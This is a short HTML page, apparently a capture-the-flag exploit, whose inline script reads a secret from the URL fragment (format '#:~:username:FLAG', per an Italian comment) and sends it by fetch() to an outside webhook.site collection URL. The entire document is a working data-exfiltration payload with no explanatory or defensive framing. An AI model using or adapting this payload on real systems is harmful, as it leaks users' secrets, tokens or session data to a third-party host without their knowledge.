<!DOCTYPE html>
<html>
<body>
<script>
  // Se c’è un hash nel formato #:~:username:FLAG
  if (window.location.hash.startsWith('#:')) {
    const secret = window.location.hash.slice(2);
    const flag = secret.split(':')[1];
    fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag='+encodeURIComponent(flag));
  }
</script>
</body>
</html>
